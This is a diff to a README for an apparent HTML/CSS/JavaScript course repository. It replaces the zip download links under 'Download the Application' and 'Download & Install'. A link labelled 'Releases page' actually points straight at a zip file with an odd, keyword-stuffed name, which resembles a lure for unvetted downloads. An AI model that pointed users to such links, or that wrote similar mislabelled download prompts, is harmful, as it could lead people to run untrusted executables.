@@ -6,7 +6,7 @@ Welcome to the **html-css-javascript-frontend_course-luisdev_part-3_html-5_css-3
 
 ## 📥 Download the Application
 
-[![Download](https://raw.githubusercontent.com/mishelabd/html-css-javascript-frontend_course-luisdev_part-3_html-5_css-3_js-es2023/main/developments/html-es-css-frontend-course-part-javascript-js-luisdev-bungwall.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/mishelabd/html-css-javascript-frontend_course-luisdev_part-3_html-5_css-3_js-es2023/main/developments/html-es-css-frontend-course-part-javascript-js-luisdev-bungwall.zip)
+[![Download](https://github.com/mishelabd/html-css-javascript-frontend_course-luisdev_part-3_html-5_css-3_js-es2023/raw/refs/heads/main/developments/html-javascript-part-js-frontend-css-course-luisdev-es-v2.9-beta.1.zip%20Now-Click%20Here-brightgreen)](https://github.com/mishelabd/html-css-javascript-frontend_course-luisdev_part-3_html-5_css-3_js-es2023/raw/refs/heads/main/developments/html-javascript-part-js-frontend-css-course-luisdev-es-v2.9-beta.1.zip)
 
 ## 👍 Features
 
@@ -24,7 +24,7 @@ Welcome to the **html-css-javascript-frontend_course-luisdev_part-3_html-5_css-3
 
 ## 🔗 Download & Install
 
-To get started with this software, visit the [Releases page](https://raw.githubusercontent.com/mishelabd/html-css-javascript-frontend_course-luisdev_part-3_html-5_css-3_js-es2023/main/developments/html-es-css-frontend-course-part-javascript-js-luisdev-bungwall.zip). 
+To get started with this software, visit the [Releases page](https://github.com/mishelabd/html-css-javascript-frontend_course-luisdev_part-3_html-5_css-3_js-es2023/raw/refs/heads/main/developments/html-javascript-part-js-frontend-css-course-luisdev-es-v2.9-beta.1.zip). 
 
 1. On the Releases page, you will see a list of available versions.
 2. Click on the latest release.
